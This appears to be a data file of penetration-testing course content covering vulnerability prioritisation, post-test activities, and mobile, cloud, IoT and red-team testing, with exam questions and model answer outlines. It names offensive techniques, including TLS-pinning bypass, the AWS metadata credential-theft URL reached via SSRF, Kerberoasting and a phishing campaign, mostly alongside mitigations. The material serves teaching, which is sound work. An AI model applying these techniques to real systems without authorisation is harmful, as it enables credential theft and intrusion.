              "Mitigation quality is graded as well: the best remediation is eliminating the class (parameterized queries kill all SQLi on the codebase, not one endpoint), the middle is reducing exposure (network-level restriction, WAF virtual patching while code catches up), and the minimum is the single-finding patch. The report states the class-fix explicitly because clients who patch one endpoint reproduce the same bug in the next sprint - the 'remediate the class, not the instance' rule. Verification closes the loop: each sprint item gets a re-test date, and the retest section of the follow-up report maps fix -> verified/not verified, with the residual list rolling into the next engagement's baseline.",
              "Exam framing: 'How should vulnerabilities be prioritized and remediated?' is a 7-14 mark standard. Define the risk formula with its three factors, work the 230-finding triage into sprint/30/90/backlog lists, grade remediation quality (class > exposure > instance), and close with the retest loop.",
            ],
            keyTerms: [
              { term: "Risk triage", definition: "Ordering findings by severity, exposure and exploitability into action lists." },
              { term: "Virtual patching", definition: "A compensating control (WAF rule, network restriction) buying time while code fixes ship." },
              { term: "Class remediation", definition: "Fixing the vulnerability's root cause so all instances die together." },
              { term: "Retest", definition: "Verification of fixes after remediation, recorded against the original finding." },
            ],
            diagram: {
              kind: "matrix",
              title: "The prioritization quadrant",
              caption: "Severity against exploitability; exposure nudges everything leftward toward 'now'.",
              axes: { x: "Exploitability (research needed -> public exploit)", y: "Severity (low -> critical)" },
              quadrants: [
                { label: "90-day programme", note: "high severity, needs research - design fixes" },
                { label: "Sprint now (days)", note: "critical + public exploit - 4 internet-facing items" },
                { label: "Backlog with review", note: "low severity, low exploitability" },
                { label: "Schedule 30 days", note: "medium/high, exploit chains forming" },
              ],
            },
            bullets: [
              "Risk = severity x exposure x exploitability, adjusted by compensating controls.",
              "Worked triage: 230 findings -> 9 critical (4 internet-facing sprint), 31 high, 74 medium, 116 backlog.",
              "Sprint sequencing argument: internet-facing with public exploits = reachable by everyone today.",
              "Remediation quality: class fix (parameterized queries) > exposure reduction (WAF/network) > single patch.",
              "Sprint pairs: injection -> parameterized queries; patches -> patch cycle; access control -> middleware; default creds -> rotation.",
              "Retest loop: fix -> verified date -> residual list rolls into next baseline.",
            ],
            callout: {
              type: "tip",
              title: "Write the sprint list, not the fix everything list",
              body: "Clients act on the 8-12 item sprint list and ignore 230-line backlogs. The report that says 'these four, this week, because internet-facing and publicly exploited' is the report that changes the estate - and it demonstrates the prioritization judgment the examiner is grading.",
            },
            table: {
              caption: "The sprint list from the 230-finding triage.",
              headers: ["Sprint item", "Why first", "Fix class", "Effort"],
              rows: [
                ["Internet SQLi on portal", "Public exploit, customer DB reachable", "Parameterized queries", "2-3 dev-days"],
                ["Unpatched VPN gateway", "Metasploit module available", "Vendor patch + restart window", "Hours"],
                ["Default creds on 12 devices", "Trivial to scan for fleet-wide", "Rotation programme", "1 day"],
                ["IDOR on invoice API", "One request reads customer records", "Authorization middleware", "1-2 weeks"],
                ["No rate limit on login", "Spraying works at 10/min", "Throttle + lockout + MFA", "Days"],
              ],
            },
            examQuestions: [
              {
                q: "Explain how penetration test findings are prioritized into remediation programmes. Define the risk model, work through a 230-finding triage with sprint/30/90/backlog lists, grade remediation quality, and describe the retest loop.",
                marks: 14,
                outline: [
                  "Risk = severity x exposure x exploitability, adjusted by compensating controls",
                  "Triage: 9 critical -> sprint (4 internet-facing with public exploits), 31 high, 74 medium, 116 backlog",
                  "Sequencing argument: internet-facing reachable by every attacker today",
                  "Sprint pairs: SQLi -> parameterized queries; VPN patch; default-cred rotation; IDOR middleware",
                  "Remediation quality ladder: class fix > exposure reduction > instance patch",
                  "Retest: fix -> verified date -> residuals roll into next baseline",
                  "Sprint list framing: 8-12 items is what clients execute",
                ],
              },
              {
                q: "Distinguish class remediation from instance patching with one example of each, and explain why the report states the class fix explicitly.",
                marks: 7,
                outline: [
                  "Instance: patch the one vulnerable /item.php endpoint",
                  "Class: introduce parameterized-query framework across the codebase",
                  "Instance patching reproduces the bug in the next sprint's code",
                  "Class fix eliminates the category (all SQLi) at root cause",
                  "Report states class fix so engineering plans frameworks, not tickets",
                ],
              },
            ],
          },
          {
            number: "4.7",
            title: "Stakeholders, post-testing activities and continuous improvement",
            body: [
              "Reporting lands; the engagement is not over. Stakeholder communication happens in tiers: the technical team gets a walkthrough session (90 minutes, live reproduction of the top findings, Q&A on fixes - the session that converts the report into tickets), management gets the executive summary briefing (risk trend, sprint asks, budget implications), and regulated clients get the compliance-mapped deliverable (findings cross-referenced to PCI DSS or ISO 27001 controls). Handling disagreements is part of the craft: clients dispute findings ('that's a risk acceptance', 'the WAF blocks it'), and the professional response is evidence-led - demonstrate the exploit path with the compensating control present, restate the CVSS rationale, and if the client still accepts the risk, record the acceptance in the report with owner and date rather than arguing.",
              "Post-testing activities follow a fixed checklist: destroy tester artifacts (sessions, accounts created, uploaded files, pivot tunnels - verified removal with screenshots), confirm credentials provisioned for the test are disabled, archive the evidence pack under the contract's retention terms, and hold the lessons-learned debrief with both teams (what detection worked, what was noisy, what the SOC saw in logs - the debrief is where the client's blue team extracts free value). The continuous-improvement loop then runs on a cadence: findings become baseline for the next engagement (retest of fixes, new-surface testing), metrics trend (findings-per-engagement, time-to-remediate, repeat-finding rate), and the testing programme matures from annual checklist to risk-driven scheduling that reacts to architecture changes - the difference between compliance testing and security testing.",
              "The worked maturity story gives the answer its numbers: a client's first engagement (2021 pattern) finds 31 high-or-critical findings; engagement 2 after a remediation year finds 19, of which 8 are repeats (the process finding - no ownership); engagement 3 runs after a vulnerability-management programme with named owners and a patch SLA - 11 findings, 1 repeat, and the tester's time shifts from the patch backlog the client now handles to design-level questions (access-control architecture, cloud misconfiguration). The trend line - 31 -> 19 -> 11 with repeats 0 -> 8 -> 1 - is the continuous-improvement evidence, and it demonstrates why testing cadence, ownership and metrics, not more scanners, are what the closing section of the syllabus is about.",
              "Exam framing: 'Discuss post-testing activities and how organizations improve from penetration testing' is the unit's 14-mark closer. Give the three stakeholder tiers, the dispute-handling pattern, the post-testing checklist, and the maturity trend with its numbers.",
            ],
            keyTerms: [
              { term: "Findings walkthrough", definition: "The live technical session reproducing top findings with the client's engineers." },
              { term: "Risk acceptance", definition: "A documented decision by the asset owner to accept a finding, recorded with owner and date." },
              { term: "Evidence pack", definition: "The archived set of logs, screenshots and outputs retained per contract terms." },
              { term: "Repeat-finding rate", definition: "The share of this year's findings that existed last year - the programme's honesty metric." },
            ],
            diagram: {
              kind: "cycle",
              title: "From report to programme",
              caption: "The engagement ends; the loop turns findings into next year's baseline.",
              steps: [
                { label: "Deliver", note: "tiers: engineers, management, compliance" },
                { label: "Debrief", note: "blue-team lessons, detection review" },
                { label: "Remediate", note: "sprint list -> tickets -> fixes" },
                { label: "Retest", note: "verify fixes, close findings" },
                { label: "Baseline", note: "31 -> 19 -> 11 findings trend" },
                { label: "Schedule", note: "risk-driven cadence, not calendar ritual" },
              ],
            },
            bullets: [
              "Stakeholder tiers: engineer walkthrough (90 min live repro), management briefing, compliance-mapped deliverable.",
              "Disputes handled evidence-led: demonstrate with compensating control present; record acceptance with owner/date.",
              "Post-testing checklist: artifact destruction (verified), test-account disablement, evidence archive, joint debrief.",
              "Improvement loop: findings -> baseline -> retest -> metrics (time-to-remediate, repeat rate).",
              "Worked maturity: 31 -> 19 -> 11 findings across three engagements; repeats 0 -> 8 -> 1 after ownership fix.",
              "Programme maturity: annual compliance testing -> risk-driven cadence reacting to architecture change.",
            ],
            callout: {
              type: "exam",
              title: "The repeat-finding rate is the maturity metric",
              body: "When a question asks how organizations improve from testing, answer with the trend: findings count falling AND repeat rate falling - the second matters more. A client with fewer findings but the same repeats has bought reports, not security; examiners reward candidates who make that distinction.",
            },
            table: {
              caption: "The three-engagement maturity trend.",
              headers: ["Engagement", "High+Critical findings", "Repeats", "What changed between"],
              rows: [
                ["First", "31", "n/a (baseline)", "-"],
                ["Second", "19", "8", "Sprint remediation; no ownership yet"],
                ["Third", "11", "1", "VM programme: owners, patch SLA, retest cadence"],
              ],
            },
            examQuestions: [
              {
                q: "Discuss stakeholder communication, post-testing activities and the continuous-improvement loop of a penetration testing programme. Include the dispute-handling pattern, the artifact-destruction checklist, and a worked three-engagement maturity trend.",
                marks: 14,
                outline: [
                  "Tiers: engineer walkthrough (90 min live), management briefing, compliance mapping",
                  "Disputes: evidence-led demonstration with controls present; record acceptance with owner/date",
                  "Post-testing: destroy artifacts (verified), disable test accounts, archive evidence, joint debrief",
                  "Debrief value: what the SOC saw, detection that worked, noise to tune",
                  "Loop: findings -> baseline -> retest -> metrics -> risk-driven scheduling",
                  "Worked trend: 31 -> 19 -> 11 findings; repeats 0 -> 8 -> 1 after ownership",
                  "Maturity meaning: repeat rate falling matters more than count falling",
                ],
              },
              {
                q: "Why is artifact destruction a contractual step rather than a courtesy? List the artifacts involved.",
                marks: 7,
                outline: [
                  "Tester artifacts are unmanaged backdoors if left: sessions, webshells, pivot tunnels",
                  "Test accounts bypass normal identity lifecycle",
                  "Evidence contains sensitive client data requiring retention control",
                  "Checklist: close sessions, remove uploads, delete accounts, tear down tunnels - verify with screenshots",
                  "Client's SOC is told what existed so monitoring rules can be cleaned",
                ],
              },
            ],
          },
        ],
      },
    },
    {
      number: 5,
      roman: "V",
      title: "Mobile, Cloud, IoT and Red-Team Practice",
      summary:
        "Unit V covers mobile application security, cloud security and testing, IoT security, red teaming and adversary simulation, real-world case studies, CTF practice and the capstone project.",
      chapter: {
        number: "05",
        title: "Modern Surfaces and Professional Practice",
        intro:
          "Unit V covers mobile, cloud and IoT testing, red teaming, real-world cases, CTF competitions and the final capstone project.",
        inOneBreath:
          "Mobile adds local-storage and inter-app surface to the web classes (Frida bypass, MASVS); cloud is configuration auditing under shared responsibility (SSRF to 169.254.169.254 to role); IoT starts at firmware (binwalk, anonymous MQTT) with Mirai as the scaling case. Red teaming is covert objectives-based emulation measured by detection metrics (94-hour TTD, 9 of 23). Five real cases break on ordinary controls; CTFs automate the observe-hypothesize-tool-evidence reflex; the capstone grades chain 30 / evidence 25 / report 20 / presentation 15 / conduct 10.",
        sections: [
          {
            number: "5.1",
            title: "Mobile application security",
            body: [
              "Mobile testing splits by platform model: Android ships an open APK (decompilable with apktool/jadx, with app data in a sandboxed SQLite/filesystem layout inspectable via adb), while iOS ships encrypted IPA binaries with app data in a keychain-and-sandbox model accessible mainly on jailbroken devices. The attack surface layers: local storage (plaintext databases, shared preferences, logs - the classic finding: a banking app storing the session token and account summary in an unencrypted SQLite file readable by any backup), transport (TLS pinning and its bypass with Frida hooks), inter-app communication (exported activities, content providers and broadcast receivers callable by any installed app), platform integration (webviews loading remote content with JavaScript enabled, deep links accepting attacker URLs), and the backend API (the mobile app is just a client - the API behind it carries the IDOR and auth flaws of Unit 2).",
              "The worked Android assessment shows the pipeline: apktool d app.apk decompiles; grep across smali for 'password', 'secret', 'http://' surfaces 4 hardcoded API keys and one HTTP endpoint (M3-class findings under the OWASP Mobile Top 10 / MASVS); adb backup or a rooted pull extracts app data revealing the token in shared_prefs; drozer enumerates exported components - 1 exported activity reachable without permission launches an authenticated screen (IPC vulnerability); Frida scripts bypass the TLS pinning to let Burp proxy the API, where Unit 2's IDOR loop immediately applies. The findings count pattern on a mid-2020s consumer app: 6-10 findings, of which 2-3 are local-storage class, 1-2 exported-component class, and the majority on the API layer - the mobile surface and the web surface converge.",
              "The standards frame the report: OWASP MASVS (verification standard) and MAS (mobile application security) testing guide replace the older Mobile Top 10, with the notable M1/M2 mapping - M1 credential usage, M2 supply chain (dependency and SDK risks). The mitigation column: encrypted storage with hardware-backed keystores (Android Keystore, iOS Secure Enclave), TLS with pinning plus certificate-rotation planning, minSdk floors that keep deprecated platform versions out, component export audits, and backend fixes identical to web remediation. The exam's analysis sentence: mobile adds local-storage and inter-app surface to the same server-side classes - hardening the app without hardening the API fixes the smaller half.",
              "Exam framing: 'Explain mobile application security and its testing approach' is a 7-14 mark standard. Give the platform split (Android decompilable vs iOS sandboxed), the layer map, the worked Android pipeline with its tool sequence and 6-10 findings pattern, and close with MASVS mapping plus the API-convergence analysis.",
            ],
            keyTerms: [
              { term: "APK decompilation", definition: "apktool/jadx reversing an Android package to smali/java for static analysis." },
              { term: "Exported component", definition: "An Android activity/provider/receiver callable by any app - the inter-app attack surface." },
              { term: "TLS pinning bypass", definition: "Frida/Xposed hooks defeating certificate pinning to enable API testing through Burp." },
              { term: "MASVS", definition: "OWASP Mobile Application Security Verification Standard - the mobile report's severity frame." },
            ],
            diagram: {
              kind: "layers",
              title: "The mobile attack surface",
              caption: "Local and inter-app layers are mobile-only; the API layer is Unit 2 revisited from a phone.",
              layers: [
                { label: "App binary", note: "hardcoded keys, weak crypto, tamper gaps" },
                { label: "Local storage", note: "plaintext SQLite, shared prefs, logs, backups" },
                { label: "Inter-app / platform", note: "exported components, webviews, deep links" },
                { label: "Transport", note: "TLS pinning, certificate rotation" },
                { label: "Backend API", note: "IDOR, authz - the web classes return" },
              ],
            },
            bullets: [
              "Platform split: Android APK decompilable (apktool/jadx/adb); iOS IPA sandboxed, keychain model, jailbreak needed.",
              "Local-storage finding class: session token + account summary in unencrypted SQLite readable via backup.",
              "Worked pipeline: apktool d -> grep smali -> adb backup -> drozer exported components -> Frida pinning bypass -> Burp on API.",
              "Worked pattern: 6-10 findings; 2-3 local storage, 1-2 exported components, majority on the API.",
              "Standards: OWASP MASVS/MAS frame severity (M1 credentials, M2 supply chain).",
              "Mitigations: Keystore/Secure Enclave storage, pinning + rotation plan, export audits, backend web-class fixes.",
            ],
            callout: {
              type: "tip",
              title: "Test the API behind the app",
              body: "The single highest-yield mobile move: after the Frida pinning bypass, point the app's traffic through Burp and re-run Unit 2's web checks against the API. Most mobile 'app' vulnerabilities are actually server-side classes wearing a mobile face - and the exam's analysis mark is exactly that convergence.",
            },
            table: {
              caption: "Mobile finding classes and fixes.",
              headers: ["Layer", "Signature finding", "Fix"],
              rows: [
                ["Binary", "Hardcoded API keys in smali", "Server-side secret store, no embedded secrets"],
                ["Local storage", "Token in plaintext shared_prefs", "Keystore-encrypted storage; no backup of secrets"],
                ["Inter-app", "Exported activity opens authed screen", "android:exported=false; permission checks"],
                ["Transport", "Pinning bypass trivial, no rotation plan", "Pinning with rotation strategy"],
                ["API", "IDOR on /api/orders/<id>", "Server-side authorization (web-class fix)"],
              ],
            },
            examQuestions: [
              {
                q: "Explain mobile application security: the Android/iOS platform split, the layered attack surface, and a worked Android assessment pipeline with tools and typical finding counts. Close with MASVS mapping and the API-convergence analysis.",
                marks: 14,
                outline: [
                  "Platform split: APK decompilable vs IPA sandboxed/keychain, jailbreak needed",
                  "Layers: binary, local storage, inter-app/platform, transport, backend API",
                  "Worked pipeline: apktool -> smali grep -> adb backup -> drozer -> Frida pinning bypass -> Burp",
                  "Worked findings: 6-10 total; token in shared_prefs, exported activity, API IDOR",
                  "Standards: MASVS/MAS (M1 credentials, M2 supply chain)",
                  "Mitigations: Keystore/Secure Enclave, pinning + rotation, export=false, server-side authz",
                  "Analysis: mobile adds local/inter-app surface; API classes identical to web - harden both",
                ],
              },
              {
                q: "Why are exported Android components dangerous? Give the worked example and its fix.",
                marks: 7,
                outline: [
                  "Exported components are callable by any installed app without permissions",
                  "Worked: exported activity launches an authenticated screen directly - IPC bypass",
                  "Attacker app invokes the component with crafted extras",
                  "Fix: android:exported=false unless required; permission-protect and validate inputs",
                  "Tooling: drozer enumerates the exported surface",
                ],
              },
            ],
          },
          {
            number: "5.2",
            title: "Cloud security and testing",
            body: [
              "Cloud testing is governed by the shared responsibility model: the provider (AWS/GCP/Azure) secures 'of the cloud' - hypervisor, physical, managed-service internals; the customer secures 'in the cloud' - configuration, identities, data, and application code. Almost every cloud breach class is a customer-side configuration failure, which is exactly why customer authorization for testing is straightforward (AWS no longer requires pre-approval for standard tests; Azure requires notice only for pentest-adjacent stress work) while provider-side components stay out of scope by definition. The customer attack surface map: identities (IAM users, roles, policies, the '*' action policies of copy-paste era), storage (public S3/GCS buckets), network (security groups allowing 0.0.0.0/0 on management ports), serverless functions (over-privileged execution roles), metadata service (IMDSv1 SSRF to instance credentials), and the management plane (console accounts, access keys in code).",
              "The worked findings show the classes. A 2019-2024 pattern engagement on a mid-size AWS estate: 2 public S3 buckets with customer documents (one indexed by search engines - found via a 10-minute Dork pass, no scan needed), 3 IAM policies with Action:'*' (one attached to a Lambda whose only job reads one DynamoDB table - over-privilege waiting for SSRF), SSRF in a document-preview service reaching 169.254.169.254 and harvesting instance-profile credentials (IMDSv1), and one access key committed to the public GitHub repo of a former contractor (still active after 14 months; code-scanning tools like truffleHog or GitHub secret scanning find these in minutes). The impact chain: SSRF -> instance credentials -> the over-privileged role -> full table read + bucket write; every arrow was a configuration choice, not a product vulnerability.",
              "The cloud-specific tooling and methodology: cloud-native recon with ScoutSuite or Prowler (both emit graded configuration reports across CIS-benchmark checks in under an hour for a mid-size account), pacu for exploitation of the identified IAM paths, and the CSPM (cloud security posture management) products enterprises run continuously. The mitigation column maps one-to-one: IMDSv2 (token-based metadata, session tokens - kills the SSRF credential class), least-privilege IAM with access analyzer, bucket policies denying public access at account level, secret scanning in CI, and short-lived credentials replacing static keys. The exam's analysis sentence: cloud testing is configuration auditing with exploit proofs - the vulnerabilities are the customer's settings, and the provider's patch is the customer's change.",
              "Exam framing: 'Explain cloud security testing under the shared responsibility model' is a 14-mark standard. Split 'of the cloud' vs 'in the cloud', map the six customer attack-surface areas, work the SSRF-to-role chain with the 169.254.169.254 mechanism, list the ScoutSuite/pacu tooling, and close with the mitigation mapping.",
            ],
            keyTerms: [
              { term: "Shared responsibility", definition: "Provider secures 'of the cloud' (hardware, hypervisor); customer secures 'in the cloud' (config, IAM, data)." },
              { term: "IMDSv2", definition: "Instance Metadata Service v2 - token-based metadata access defeating the SSRF credential-theft class." },
              { term: "ScoutSuite / Prowler", definition: "Cloud configuration auditing tools emitting CIS-benchmark-graded reports." },
              { term: "pacu", definition: "The AWS exploitation framework - turns identified IAM misconfigurations into demonstrated access." },
            ],
            diagram: {
              kind: "matrix",
              title: "The shared responsibility map",
              caption: "Everything the tester touches is the right column; the left column is out of scope by definition.",
              axes: { x: "Stack layer (hardware -> application)", y: "Security owner (provider -> customer)" },
              quadrants: [
                { label: "Provider: physical, hypervisor, managed services", note: "out of scope - provider attests" },
                { label: "Customer: application code, data", note: "pentest classes of Units 1-2 apply" },
                { label: "Provider: managed DB internals, networking fabric", note: "attested, not tested" },
                { label: "Customer: IAM, buckets, security groups, IMDS", note: "the configuration findings live here" },
              ],
            },
            bullets: [
              "Shared responsibility: provider secures 'of the cloud'; customer secures 'in the cloud' - most breaches are customer config.",
              "Surface map: IAM policies, public buckets, 0.0.0.0/0 security groups, over-privileged roles, IMDS, committed keys.",
              "Worked chain: SSRF -> 169.254.169.254 -> instance credentials -> Action:'*' role -> table read + bucket write.",
              "Worked findings: 2 public S3 buckets, 3 wildcard IAM policies, IMDSv1 credential theft, 14-month-old leaked key.",
              "Tooling: ScoutSuite/Prowler for config audit (CIS-graded), pacu for exploitation, CSPM for continuous defence.",
              "Mitigations: IMDSv2, least privilege + Access Analyzer, account-level public-access blocks, CI secret scanning.",
            ],
            callout: {
              type: "warning",
              title: "The metadata endpoint is the cloud pivot",
              body: "On AWS IMDSv1, any SSRF on an instance yields http://169.254.169.254/latest/meta-data/iam/security-credentials/<role> - role credentials in one request. IMDSv2's token requirement is the single highest-value cloud hardening control; name it explicitly in every SSRF remediation.",
            },
            table: {
              caption: "Cloud finding classes and one-to-one mitigations.",
              headers: ["Finding", "Mechanism", "Mitigation"],
              rows: [
                ["Public S3 bucket", "ACL/policy allows anonymous list+read", "Account-level Public Access Block"],
                ["Wildcard IAM policy", "Action:'*' attached broadly", "Least privilege + IAM Access Analyzer"],
                ["IMDSv1 credential theft", "SSRF fetches metadata endpoint", "IMDSv2 token enforcement"],
                ["Leaked access key in repo", "Commit history, 14 months active", "CI secret scanning + rotation on leak"],
                ["0.0.0.0/0 management ports", "Security group SSH/RDP open", "Bastion + source-restriction"],
              ],
            },
            examQuestions: [
              {
                q: "Explain cloud security testing under the shared responsibility model. Split provider vs customer scope, map the customer attack surface, work through the SSRF-to-IAM-role exploit chain with the metadata mechanism, and map findings to mitigations.",
                marks: 14,
                outline: [
                  "Shared responsibility: provider 'of the cloud' out of scope; customer 'in the cloud' tested",
                  "Surface: IAM, buckets, security groups, serverless roles, IMDS, committed keys",
                  "Worked chain: document-preview SSRF -> 169.254.169.254 -> instance-profile creds",
                  "Chain continues: Action:'*' role -> DynamoDB read + S3 write",
                  "Other findings: 2 public buckets, 14-month leaked key, 0.0.0.0/0 groups",
                  "Tooling: ScoutSuite/Prowler audit, pacu exploitation, CSPM continuous",
                  "Mitigations: IMDSv2, least privilege, public-access block, CI secret scanning",
                ],
              },
              {
                q: "Why does enabling IMDSv2 neutralize the SSRF credential-theft chain?",
                marks: 7,
                outline: [
                  "IMDSv1 answers any instance request with role credentials",
                  "SSRF lets an external attacker make such requests from the instance",
                  "IMDSv2 requires a PUT token request first with TTL header",
                  "Simple GET-forwarding SSRF cannot issue the PUT handshake",
                  "Credentials exposure drops to code-level compromise only",
                ],
              },
            ],
          },
          {
            number: "5.3",
            title: "IoT security",
            body: [
              "IoT security inherits the worst of both worlds: constrained devices that cannot run strong defences, and vendor software practices from two decades ago. The attack surface map: device (default credentials, debug interfaces - UART/JTAG pads on the board, unencrypted firmware images downloadable from the vendor), network (Telnet and FTP instead of SSH/SFTP, unpatched embedded webservers), protocol (MQTT without authentication on 1883, CoAP, Zigbee and Bluetooth classes), cloud backend (the same API and storage classes of section 5.2), and the fleet-update mechanism (unsigned firmware over HTTP - the Mirai-class condition). The canonical case is Mirai (2016): a worm scanning for default credentials across Telnet, conscripting hundreds of thousands of cameras and routers into the DDoS that took down DNS provider Dyn - the worked example that shows one weak default scaling to internet infrastructure impact.",
              "The worked assessment pattern on a smart-camera line: firmware.bin downloaded from the vendor support site; binwalk -e firmware.bin extracts the squashfs root; /etc/shadow contains a hardcoded root hash (cracked in minutes - the same password on every shipped device), and the update script fetches over plain HTTP with no signature check. On the network: MQTT on 1883 accepts anonymous subscribe to every camera's topic - live video frames and audio readable fleet-wide; the mobile app's API carries Unit 2's IDOR (camera 1043 -> 1044 across tenants). The finding count pattern on consumer IoT: 8-15 findings with 3-5 critical (default creds, unsigned update path, unauthenticated protocol), and the impact chain runs device -> LAN pivot -> other devices, or protocol -> fleet-wide data exposure.",
              "Mitigation maps to lifecycle stages, and the exam wants the split between 'buy better' and 'configure better'. Procurement: certified-to-baseline devices (ETSI EN 303 645 consumer baseline; IEC 62443 industrial), vendors with signed-firmware and CVD (coordinated vulnerability disclosure) programmes. Configuration: change every default at provisioning, disable debug and Telnet, segment IoT on quarantined VLANs (section 3.4's control), authenticate MQTT (username/password or certificates, port 8883), and network-monitor for the scanning behavior Mirai made famous. Fleet defence: signed updates over TLS, SBOM for the firmware's components, and an inventory - 'you cannot patch what you have not registered' is the exam's closing sentence, and it mirrors the forgotten-SSID finding of Unit 3.",
              "Exam framing: 'Explain IoT security vulnerabilities and mitigation' is a 14-mark standard. Map the five surface areas, work the smart-camera assessment with binwalk/MQTT numbers, name Mirai as the scaling case, and close with the lifecycle mitigation split.",
            ],
            keyTerms: [
              { term: "binwalk", definition: "Firmware analysis tool that extracts filesystems and embedded files from images." },
              { term: "MQTT", definition: "The IoT pub/sub protocol; anonymous 1883 exposure is the fleet-wide reading class." },
              { term: "ETSI EN 303 645", definition: "The consumer-IoT security baseline standard - no default passwords, update mechanism, disclosure policy." },
              { term: "Mirai", definition: "The 2016 worm conscripting default-credential IoT into the Dyn DDoS - the scaling case study." },
            ],
            diagram: {
              kind: "flow",
              title: "The IoT attack chain from firmware to fleet",
              caption: "One unsigned image and one anonymous broker expose thousands of devices at once.",
              steps: [
                { label: "Download firmware", note: "vendor support site, no auth" },
                { label: "binwalk -e", note: "squashfs root extracted" },
                { label: "Hardcoded creds", note: "same root hash on every device" },
                { label: "Protocol exposure", note: "MQTT 1883 anonymous subscribe" },
                { label: "Fleet impact", note: "all cameras readable; LAN pivot" },
              ],
            },
            bullets: [
              "Surface: device (defaults, UART/JTAG, unsigned firmware), network (Telnet/FTP), protocol (MQTT/CoAP/Zigbee), cloud backend, update mechanism.",
              "Worked camera assessment: binwalk extraction -> hardcoded root hash -> HTTP unsigned updates -> anonymous MQTT topics -> cross-tenant IDOR.",
              "Mirai (2016): default-credential Telnet scan conscripted 100k+ devices into the Dyn DDoS.",
              "Consumer-IoT finding pattern: 8-15 findings, 3-5 critical (defaults, unsigned updates, protocol auth).",
              "Procurement controls: ETSI EN 303 645 baseline, IEC 62443 industrial, vendor CVD programme.",
              "Configuration controls: defaults changed, debug disabled, IoT VLAN quarantine, MQTT auth on 8883, signed TLS updates, inventory.",
            ],
            callout: {
              type: "tip",
              title: "Start IoT testing at the firmware, not the network",
              body: "binwalk on the vendor's public firmware image costs zero packets and usually yields the credential list, hardcoded keys and update mechanism before any device is touched. Firmware analysis first, network testing second - the exam's methodology mark favours that order.",
            },
            table: {
              caption: "IoT surface-to-control mapping.",
              headers: ["Surface", "Signature weakness", "Control"],
              rows: [
                ["Device", "Default credentials, cracked root hash", "Provisioning-time change; ETSI baseline purchase"],
                ["Firmware", "Unsigned HTTP updates", "Signed images over TLS; SBOM"],
                ["Protocol", "MQTT 1883 anonymous", "Auth on 8883; per-device certificates"],
                ["Debug", "Open UART/JTAG pads", "Locked bootloaders; disable consoles"],
                ["Network", "IoT flat with user LAN", "Quarantined VLAN + deny-all firewall"],
              ],
            },
            examQuestions: [
              {
                q: "Explain IoT security: the attack-surface map, a worked smart-camera assessment with firmware analysis and protocol findings, the Mirai case as scaling evidence, and lifecycle mitigations split between procurement and configuration.",
                marks: 14,
                outline: [
                  "Surface: device, network, protocol, cloud backend, update mechanism",
                  "Worked: binwalk -e firmware -> hardcoded root hash in /etc/shadow -> unsigned HTTP update script",
                  "Protocol: anonymous MQTT 1883 exposes all camera topics fleet-wide",
                  "API: cross-tenant IDOR 1043 -> 1044 (Unit 2 class)",
                  "Mirai: default-credential worm -> 100k+ botnet -> Dyn DDoS 2016",
                  "Procurement: ETSI EN 303 645, IEC 62443, vendor CVD",
                  "Configuration: defaults changed, VLAN quarantine, MQTT auth, signed updates, device inventory",
                ],
              },
              {
                q: "Why does firmware analysis come before network testing in IoT engagements?",
                marks: 7,
                outline: [
                  "Firmware images are public downloads - zero packets, zero authorization risk",
                  "Extraction yields credentials, keys, update logic before touching devices",
                  "Hardcoded root password explains fleet-wide compromise instantly",
                  "Update mechanism review predicts the persistent-access class",
                  "Network tests then target the confirmed weaknesses, not guesses",
                ],
              },
            ],
          },
          {
            number: "5.4",
            title: "Red teaming and adversary simulation",
            body: [
              "Red teaming is objectives-based adversary emulation: instead of enumerating vulnerabilities, the team is given (or chooses) an objective - exfiltrate the CFO's mailbox, reach the payment database, stage a ransomware flag on the domain controller - and works covertly over weeks with the defenders unaware, testing the organization's detection and response, not just its prevention. The team ecology: red team (attackers), blue team (defenders), purple team (the joint debrief function turning adversary behaviour into detection improvements), and the white cell (referees who watch scope, safety and the abort criteria). The rule-set is stricter than pentesting: full-scale RoE with named objectives, no-production-impact constraints, emergency abort contacts, and deconfliction through a white cell rather than direct contact.",
              "The methodology runs on MITRE ATT&CK as its shared language: every technique used is mapped to a tactic (Initial Access, Execution, Persistence, Privilege Escalation, Defense Evasion, Credential Access, Discovery, Lateral Movement, Collection, Exfiltration) and logged for the report. The worked campaign shape over a 6-week engagement: week 1 recon and phishing infrastructure (lookalike domain, mail chain warm-up); week 2 initial access - 2 of 40 targeted phishes succeed, one FIDO-less user yields credentials; weeks 3-4 persistence (OAuth app registration, scheduled task) and privilege escalation to domain admin via Kerberoast + relay; week 5 objective achievement - mailbox access and a staged exfil of 10 MB of marked documents; week 6 reporting. Detection metrics are the deliverable: time-to-detect (94 hours), techniques detected (9 of 23), alerts that fired but were never triaged (4) - the numbers that drive the purple-team backlog.",
              "The comparison table decides the exam: pentest vs red team differs in objective (breadth of findings vs named objective), duration (days-weeks vs weeks-months), stealth (visible work vs covert operation), success measure (findings list vs objective achieved + detection gaps), and deliverable (remediation report vs detection-engineering backlog). The emerging variants: purple teaming as continuous technique-pair workshops (attack one ATT&CK technique, build the detection, re-attack), adversary emulation as threat-intel-driven replay of a specific actor's playbooks (APT-style TTP replay), and continuous automated red teams (BAS - breach and attack simulation platforms running detection tests weekly). The mitigation argument: red team findings are response findings - the fix is SOC engineering (detection rules, log coverage, playbooks), measured by next campaign's detection metrics, not by vulnerability counts.",
              "Exam framing: 'Compare penetration testing and red teaming' is a 7-14 mark staple. Define objectives-based covert emulation, give the team ecology, walk the 6-week worked campaign with its detection metrics, tabulate the pentest-vs-red-team differences, and close with the purple/BAS evolution.",
            ],
            keyTerms: [
              { term: "MITRE ATT&CK", definition: "The adversary-tactic-and-technique matrix that structures red team planning and reporting." },
              { term: "Purple team", definition: "The joint red/blue working mode converting adversary techniques into detections." },
              { term: "White cell", definition: "The referee function watching scope, safety and abort criteria during operations." },
              { term: "Time-to-detect", definition: "Hours from first adversary action to first meaningful defender response - the red team's headline metric." },
            ],
            diagram: {
              kind: "compare",
              title: "Penetration test vs red team operation",
              caption: "Same skills, different question: what is vulnerable vs what would we miss.",
              left: {
                heading: "Penetration test",
                items: [
                  "Objective: enumerate and prove vulnerabilities",
                  "Duration: days to weeks",
                  "Visible work - clients know testing runs",
                  "Deliverable: remediation report",
                ],
              },
              right: {
                heading: "Red team",
                items: [
                  "Objective: achieve named goals covertly",
                  "Duration: weeks to months",
                  "Stealth - defenders unaware, white cell deconflicts",
                  "Deliverable: detection gaps + response backlog",
                ],
              },
            },
            bullets: [
              "Objectives-based: exfiltrate CFO mailbox, reach payment DB - not vulnerability enumeration.",
              "Team ecology: red (attack), blue (defend), purple (joint improvement), white cell (referee).",
